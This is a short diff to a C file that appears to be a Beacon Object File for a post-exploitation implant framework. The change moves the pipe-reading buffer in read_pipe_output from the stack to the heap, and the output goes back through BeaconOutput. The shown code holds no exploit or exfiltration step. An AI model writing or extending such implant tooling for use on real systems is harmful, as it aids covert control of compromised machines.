@@ -61,13 +61,12 @@ static void fmt_err(const char *prefix, DWORD code)
  * -----------------------------------------------------------------------*/
 static void read_pipe_output(HANDLE pipe_read)
 {
-    char   buf[4096];
+    char  *buf = (char*)MSVCRT$malloc(4096);
     DWORD  bytes_read = 0;
-    while (KERNEL32$ReadFile(pipe_read, buf, sizeof(buf), &bytes_read, NULL)
-           && bytes_read > 0)
-    {
+    if (!buf) return;
+    while (KERNEL32$ReadFile(pipe_read, buf, 4096, &bytes_read, NULL) && bytes_read > 0)
         BeaconOutput(CALLBACK_OUTPUT, buf, (int)bytes_read);
-    }
+    MSVCRT$free(buf);
 }
 
 /* -------------------------------------------------------------------------
